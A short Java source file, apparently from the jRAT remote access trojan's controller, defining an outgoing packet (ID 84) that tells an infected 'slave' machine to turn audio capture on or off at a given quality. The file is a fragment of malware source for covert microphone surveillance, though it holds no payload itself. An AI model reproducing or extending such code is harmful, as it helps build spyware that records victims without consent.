package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet84ToggleSoundCapture extends AbstractOutgoingPacket {

	private boolean enable;
	private int quality;
	
	public Packet84ToggleSoundCapture(boolean enable, int quality) {
		this.enable = enable;
		this.quality = quality;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(enable);
		dos.writeInt(quality);
	}

	@Override
	public short getPacketId() {
		return 84;
	}

}
